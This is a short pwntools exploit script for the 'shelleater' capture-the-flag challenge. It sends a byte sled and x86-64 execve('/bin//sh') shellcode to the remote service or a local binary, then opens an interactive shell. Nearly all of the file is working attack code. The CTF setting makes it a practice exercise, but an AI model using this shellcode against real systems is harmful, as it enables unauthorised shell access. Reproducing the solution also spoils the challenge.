#!/usr/bin/python3

from pwn import *

exe = ELF('shelleater', checksec=False)
# libc = ELF('0', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x401052 

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('shelleater.wolvctf.io', 1337)
else:
        p = process(exe.path)

"\x48\xFF\xC0"
pa = "\xFE\xC0"*32 + "\x48\xFF\xC0"
pa += '\x48\x31\xFF\x57\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x31\xF6\x48\x31\xD2\x48\x89\xE7\x48\x31\xC0\x48\x83\xC0\x3B\x0F\x05'
sa(b':)\n', pa)
# GDB()

p.interactive()
